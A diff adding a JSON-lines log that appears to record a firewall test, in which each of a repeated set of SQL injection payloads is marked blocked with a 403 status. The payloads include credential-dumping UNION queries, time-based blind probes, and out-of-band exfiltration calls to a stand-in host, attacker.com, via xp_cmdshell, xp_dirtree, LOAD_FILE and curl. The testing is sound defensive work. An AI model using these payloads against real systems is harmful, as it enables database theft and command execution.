@@ -1,0 +1,300 @@
+{"payload": "' UNION SELECT username, password FROM users WHERE '1'='1'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.012492560999817215}
+{"payload": "'; EXEC xp_cmdshell('nslookup attacker.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005281220001052134}
+{"payload": "' UNION SELECT 1,2 WHERE LOAD_FILE('\\\\attacker.com\\file')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005127203003212344}
+{"payload": "'; DECLARE @cmd NVARCHAR(4000); SET @cmd='curl http://attacker.com/?data=leak'; EXEC(@cmd);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006096299999626353}
+{"payload": "' OR 1=1 UNION SELECT 1,2,3 FROM users WHERE '1'='1'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004333734003012069}
+{"payload": "' AND IF(1=1,SLEEP(5),0)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0035178489997633733}
+{"payload": "' UNION SELECT 1,2 WHERE ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004623524000635371}
+{"payload": "' AND 1=IF((SELECT DATABASE())='test_db',SLEEP(10),0)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0037880710005993024}
+{"payload": "' OR IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004004166999948211}
+{"payload": "'; EXEC xp_fileexist '\\\\attacker.com\\check'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0035874969980795868}
+{"payload": "'; EXEC master..xp_dirtree '\\\\attacker.com\\leak'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004361303006589878}
+{"payload": "' UNION SELECT IF(1=1,LOAD_FILE('\\\\attacker.com\\file'),NULL)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003626668003562372}
+{"payload": "'; DECLARE @cmd NVARCHAR(4000); SET @cmd='ping attacker.com'; EXEC(@cmd);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004232803999911994}
+{"payload": "' UNION SELECT 1,2 WHERE LOAD_FILE('\\\\attacker.com\\leak')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0038737149952794425}
+{"payload": "' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005986764997942373}
+{"payload": "' UNION SELECT username, password FROM users WHERE '1'='1'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005130334000568837}
+{"payload": "'; EXEC xp_cmdshell('nslookup attacker.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003909214996383525}
+{"payload": "' UNION SELECT 1,2 WHERE LOAD_FILE('\\\\attacker.com\\file')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004373679999844171}
+{"payload": "'; DECLARE @cmd NVARCHAR(4000); SET @cmd='curl http://attacker.com/?data=leak'; EXEC(@cmd);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004421132995048538}
+{"payload": "' OR 1=1 UNION SELECT 1,2,3 FROM users WHERE '1'='1'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0035910930018872023}
+{"payload": "' AND IF(1=1,SLEEP(5),0)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0030751520025660284}
+{"payload": "' UNION SELECT 1,2 WHERE ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003978945002018008}
+{"payload": "' AND 1=IF((SELECT DATABASE())='test_db',SLEEP(10),0)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0043959640024695545}
+{"payload": "' OR IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004280201996152755}
+{"payload": "'; EXEC xp_fileexist '\\\\attacker.com\\check'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0033126310008810833}
+{"payload": "'; EXEC master..xp_dirtree '\\\\attacker.com\\leak'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.002863093002815731}
+{"payload": "' UNION SELECT IF(1=1,LOAD_FILE('\\\\attacker.com\\file'),NULL)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0040979469995363615}
+{"payload": "'; DECLARE @cmd NVARCHAR(4000); SET @cmd='ping attacker.com'; EXEC(@cmd);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0030861339982948266}
+{"payload": "' UNION SELECT 1,2 WHERE LOAD_FILE('\\\\attacker.com\\leak')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.002979257005790714}
+{"payload": "' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003349867998622358}
+{"payload": "' UNION SELECT username, password FROM users WHERE '1'='1'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0029934000049252063}
+{"payload": "'; EXEC xp_cmdshell('nslookup attacker.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0027184139980818145}
+{"payload": "' UNION SELECT 1,2 WHERE LOAD_FILE('\\\\attacker.com\\file')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0029553400017903186}
+{"payload": "'; DECLARE @cmd NVARCHAR(4000); SET @cmd='curl http://attacker.com/?data=leak'; EXEC(@cmd);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.002948847999505233}
+{"payload": "' OR 1=1 UNION SELECT 1,2,3 FROM users WHERE '1'='1'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0031779519995325245}
+{"payload": "' AND IF(1=1,SLEEP(5),0)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0030939780044718646}
+{"payload": "' UNION SELECT 1,2 WHERE ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0029456260017468594}
+{"payload": "' AND 1=IF((SELECT DATABASE())='test_db',SLEEP(10),0)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003105286006757524}
+{"payload": "' OR IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0030526129994541407}
+{"payload": "'; EXEC xp_fileexist '\\\\attacker.com\\check'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005285548999381717}
+{"payload": "'; EXEC master..xp_dirtree '\\\\attacker.com\\leak'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004695944000559393}
+{"payload": "' UNION SELECT IF(1=1,LOAD_FILE('\\\\attacker.com\\file'),NULL)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006062245003704447}
+{"payload": "'; DECLARE @cmd NVARCHAR(4000); SET @cmd='ping attacker.com'; EXEC(@cmd);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004331620002631098}
+{"payload": "' UNION SELECT 1,2 WHERE LOAD_FILE('\\\\attacker.com\\leak')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0035930230005760677}
+{"payload": "' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0036802009999519214}
+{"payload": "' UNION SELECT username, password FROM users WHERE '1'='1'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003081543996813707}
+{"payload": "'; EXEC xp_cmdshell('nslookup attacker.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0035953879996668547}
+{"payload": "' UNION SELECT 1,2 WHERE LOAD_FILE('\\\\attacker.com\\file')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003039664006792009}
+{"payload": "'; DECLARE @cmd NVARCHAR(4000); SET @cmd='curl http://attacker.com/?data=leak'; EXEC(@cmd);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003381816000910476}
+{"payload": "' OR 1=1 UNION SELECT 1,2,3 FROM users WHERE '1'='1'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004063161002704874}
+{"payload": "' AND IF(1=1,SLEEP(5),0)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0036028329996042885}
+{"payload": "' UNION SELECT 1,2 WHERE ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003815146003034897}
+{"payload": "' AND 1=IF((SELECT DATABASE())='test_db',SLEEP(10),0)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0036252499994589016}
+{"payload": "' OR IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003357788998982869}
+{"payload": "'; EXEC xp_fileexist '\\\\attacker.com\\check'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00695169700338738}
+{"payload": "'; EXEC master..xp_dirtree '\\\\attacker.com\\leak'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0074804559990298}
+{"payload": "' UNION SELECT IF(1=1,LOAD_FILE('\\\\attacker.com\\file'),NULL)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006217194000782911}
+{"payload": "'; DECLARE @cmd NVARCHAR(4000); SET @cmd='ping attacker.com'; EXEC(@cmd);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006083045002014842}
+{"payload": "' UNION SELECT 1,2 WHERE LOAD_FILE('\\\\attacker.com\\leak')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005887156003154814}
+{"payload": "' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0067644459995790385}
+{"payload": "' UNION SELECT username, password FROM users WHERE '1'='1'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005065224002464674}
+{"payload": "'; EXEC xp_cmdshell('nslookup attacker.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005490549003297929}
+{"payload": "' UNION SELECT 1,2 WHERE LOAD_FILE('\\\\attacker.com\\file')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006846610995125957}
+{"payload": "'; DECLARE @cmd NVARCHAR(4000); SET @cmd='curl http://attacker.com/?data=leak'; EXEC(@cmd);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005873037996934727}
+{"payload": "' OR 1=1 UNION SELECT 1,2,3 FROM users WHERE '1'='1'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005880483004148118}
+{"payload": "' AND IF(1=1,SLEEP(5),0)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006113458002801053}
+{"payload": "' UNION SELECT 1,2 WHERE ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00563166899519274}
+{"payload": "' AND 1=IF((SELECT DATABASE())='test_db',SLEEP(10),0)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00680047100468073}
+{"payload": "' OR IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006243474002985749}
+{"payload": "'; EXEC xp_fileexist '\\\\attacker.com\\check'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005284290993586183}
+{"payload": "'; EXEC master..xp_dirtree '\\\\attacker.com\\leak'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006771770000341348}
+{"payload": "' UNION SELECT IF(1=1,LOAD_FILE('\\\\attacker.com\\file'),NULL)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.007218908998765983}
+{"payload": "'; DECLARE @cmd NVARCHAR(4000); SET @cmd='ping attacker.com'; EXEC(@cmd);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0064101829993887804}
+{"payload": "' UNION SELECT 1,2 WHERE LOAD_FILE('\\\\attacker.com\\leak')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004447453997272532}
+{"payload": "' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006419846002245322}
+{"payload": "' UNION SELECT username, password FROM users WHERE '1'='1'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0056632229971000925}
+{"payload": "'; EXEC xp_cmdshell('nslookup attacker.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006342595996102318}
+{"payload": "' UNION SELECT 1,2 WHERE LOAD_FILE('\\\\attacker.com\\file')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006110678004915826}
+{"payload": "'; DECLARE @cmd NVARCHAR(4000); SET @cmd='curl http://attacker.com/?data=leak'; EXEC(@cmd);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005572788999415934}
+{"payload": "' OR 1=1 UNION SELECT 1,2,3 FROM users WHERE '1'='1'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0066180580033687875}
+{"payload": "' AND IF(1=1,SLEEP(5),0)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0056173859993577935}
+{"payload": "' UNION SELECT 1,2 WHERE ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.008450332999927923}
+{"payload": "' AND 1=IF((SELECT DATABASE())='test_db',SLEEP(10),0)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006417682001483627}
+{"payload": "' OR IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006769324994820636}
+{"payload": "'; EXEC xp_fileexist '\\\\attacker.com\\check'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005435201994259842}
+{"payload": "'; EXEC master..xp_dirtree '\\\\attacker.com\\leak'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005228963993431535}
+{"payload": "' UNION SELECT IF(1=1,LOAD_FILE('\\\\attacker.com\\file'),NULL)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006383346000802703}
+{"payload": "'; DECLARE @cmd NVARCHAR(4000); SET @cmd='ping attacker.com'; EXEC(@cmd);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006346623005811125}
+{"payload": "' UNION SELECT 1,2 WHERE LOAD_FILE('\\\\attacker.com\\leak')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0055356369994115084}
+{"payload": "' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006238207999558654}
+{"payload": "' UNION SELECT username, password FROM users WHERE '1'='1'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.007207693000964355}
+{"payload": "'; EXEC xp_cmdshell('nslookup attacker.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005442799003503751}
+{"payload": "' UNION SELECT 1,2 WHERE LOAD_FILE('\\\\attacker.com\\file')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005810527996800374}
+{"payload": "'; DECLARE @cmd NVARCHAR(4000); SET @cmd='curl http://attacker.com/?data=leak'; EXEC(@cmd);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004150660999584943}
+{"payload": "' OR 1=1 UNION SELECT 1,2,3 FROM users WHERE '1'='1'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0053947850028635}
+{"payload": "' AND IF(1=1,SLEEP(5),0)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005658975002006628}
+{"payload": "' UNION SELECT 1,2 WHERE ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005576767995080445}
+{"payload": "' AND 1=IF((SELECT DATABASE())='test_db',SLEEP(10),0)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005219074999331497}
+{"payload": "' OR IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004792751002241857}
+{"payload": "'; EXEC xp_fileexist '\\\\attacker.com\\check'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0036972739981138147}
+{"payload": "'; EXEC master..xp_dirtree '\\\\attacker.com\\leak'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004277877000276931}
+{"payload": "' UNION SELECT IF(1=1,LOAD_FILE('\\\\attacker.com\\file'),NULL)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004793496002093889}
+{"payload": "'; DECLARE @cmd NVARCHAR(4000); SET @cmd='ping attacker.com'; EXEC(@cmd);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004916792000585701}
+{"payload": "' UNION SELECT 1,2 WHERE LOAD_FILE('\\\\attacker.com\\leak')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004122201004065573}
+{"payload": "' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006709314999170601}
+{"payload": "' UNION SELECT username, password FROM users WHERE '1'='1'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005836036994878668}
+{"payload": "'; EXEC xp_cmdshell('nslookup attacker.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004096796998055652}
+{"payload": "' UNION SELECT 1,2 WHERE LOAD_FILE('\\\\attacker.com\\file')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00462602900370257}
+{"payload": "'; DECLARE @cmd NVARCHAR(4000); SET @cmd='curl http://attacker.com/?data=leak'; EXEC(@cmd);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004317242004617583}
+{"payload": "' OR 1=1 UNION SELECT 1,2,3 FROM users WHERE '1'='1'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005434701997728553}
+{"payload": "' AND IF(1=1,SLEEP(5),0)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004581984001561068}
+{"payload": "' UNION SELECT 1,2 WHERE ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004219665002892725}
+{"payload": "' AND 1=IF((SELECT DATABASE())='test_db',SLEEP(10),0)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0043031259992858395}
+{"payload": "' OR IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0038892360025784}
+{"payload": "'; EXEC xp_fileexist '\\\\attacker.com\\check'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00422394199995324}
+{"payload": "'; EXEC master..xp_dirtree '\\\\attacker.com\\leak'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003911127001629211}
+{"payload": "' UNION SELECT IF(1=1,LOAD_FILE('\\\\attacker.com\\file'),NULL)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004890109994448721}
+{"payload": "'; DECLARE @cmd NVARCHAR(4000); SET @cmd='ping attacker.com'; EXEC(@cmd);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005671069004165474}
+{"payload": "' UNION SELECT 1,2 WHERE LOAD_FILE('\\\\attacker.com\\leak')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006346613998175599}
+{"payload": "' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.007023682999715675}
+{"payload": "' UNION SELECT username, password FROM users WHERE '1'='1'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006256518994632643}
+{"payload": "'; EXEC xp_cmdshell('nslookup attacker.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.008322863002831582}
+{"payload": "' UNION SELECT 1,2 WHERE LOAD_FILE('\\\\attacker.com\\file')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.008188134001102298}
+{"payload": "'; DECLARE @cmd NVARCHAR(4000); SET @cmd='curl http://attacker.com/?data=leak'; EXEC(@cmd);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006768018996808678}
+{"payload": "' OR 1=1 UNION SELECT 1,2,3 FROM users WHERE '1'='1'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.007322096993448213}
+{"payload": "' AND IF(1=1,SLEEP(5),0)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00501093400089303}
+{"payload": "' UNION SELECT 1,2 WHERE ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004663505998905748}
+{"payload": "' AND 1=IF((SELECT DATABASE())='test_db',SLEEP(10),0)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006883301000925712}
+{"payload": "' OR IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006165790000522975}
+{"payload": "'; EXEC xp_fileexist '\\\\attacker.com\\check'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005730047996621579}
+{"payload": "'; EXEC master..xp_dirtree '\\\\attacker.com\\leak'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.007538040998042561}
+{"payload": "' UNION SELECT IF(1=1,LOAD_FILE('\\\\attacker.com\\file'),NULL)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005687644996214658}
+{"payload": "'; DECLARE @cmd NVARCHAR(4000); SET @cmd='ping attacker.com'; EXEC(@cmd);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006946389003132936}
+{"payload": "' UNION SELECT 1,2 WHERE LOAD_FILE('\\\\attacker.com\\leak')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006094447002396919}
+{"payload": "' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005758215993409976}
+{"payload": "' UNION SELECT username, password FROM users WHERE '1'='1'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006582620997505728}
+{"payload": "'; EXEC xp_cmdshell('nslookup attacker.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004576042003463954}
+{"payload": "' UNION SELECT 1,2 WHERE LOAD_FILE('\\\\attacker.com\\file')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0044361120017129}
+{"payload": "'; DECLARE @cmd NVARCHAR(4000); SET @cmd='curl http://attacker.com/?data=leak'; EXEC(@cmd);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004528008998022415}
+{"payload": "' OR 1=1 UNION SELECT 1,2,3 FROM users WHERE '1'='1'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00642091799818445}
+{"payload": "' AND IF(1=1,SLEEP(5),0)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004192031999991741}
+{"payload": "' UNION SELECT 1,2 WHERE ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005055627996625844}
+{"payload": "' AND 1=IF((SELECT DATABASE())='test_db',SLEEP(10),0)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004589652999129612}
+{"payload": "' OR IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0035802540005533956}
+{"payload": "'; EXEC xp_fileexist '\\\\attacker.com\\check'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0029859640053473413}
+{"payload": "'; EXEC master..xp_dirtree '\\\\attacker.com\\leak'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0036843459965894}
+{"payload": "' UNION SELECT IF(1=1,LOAD_FILE('\\\\attacker.com\\file'),NULL)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004381245998956729}
+{"payload": "'; DECLARE @cmd NVARCHAR(4000); SET @cmd='ping attacker.com'; EXEC(@cmd);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0035085899944533594}
+{"payload": "' UNION SELECT 1,2 WHERE LOAD_FILE('\\\\attacker.com\\leak')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0033743299936759286}
+{"payload": "' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0038692779999109916}
+{"payload": "' UNION SELECT username, password FROM users WHERE '1'='1'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004448795996722765}
+{"payload": "'; EXEC xp_cmdshell('nslookup attacker.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004003895999630913}
+{"payload": "' UNION SELECT 1,2 WHERE LOAD_FILE('\\\\attacker.com\\file')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0035549370004446246}
+{"payload": "'; DECLARE @cmd NVARCHAR(4000); SET @cmd='curl http://attacker.com/?data=leak'; EXEC(@cmd);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003848369997285772}
+{"payload": "' OR 1=1 UNION SELECT 1,2,3 FROM users WHERE '1'='1'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0033590210005058907}
+{"payload": "' AND IF(1=1,SLEEP(5),0)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0037719980027759448}
+{"payload": "' UNION SELECT 1,2 WHERE ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004261479996785056}
+{"payload": "' AND 1=IF((SELECT DATABASE())='test_db',SLEEP(10),0)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005018452000513207}
+{"payload": "' OR IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004098183002497535}
+{"payload": "'; EXEC xp_fileexist '\\\\attacker.com\\check'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0051912060007452965}
+{"payload": "'; EXEC master..xp_dirtree '\\\\attacker.com\\leak'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00616501899639843}
+{"payload": "' UNION SELECT IF(1=1,LOAD_FILE('\\\\attacker.com\\file'),NULL)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0055038310019881465}
+{"payload": "'; DECLARE @cmd NVARCHAR(4000); SET @cmd='ping attacker.com'; EXEC(@cmd);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00455008299468318}
+{"payload": "' UNION SELECT 1,2 WHERE LOAD_FILE('\\\\attacker.com\\leak')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006310002994723618}
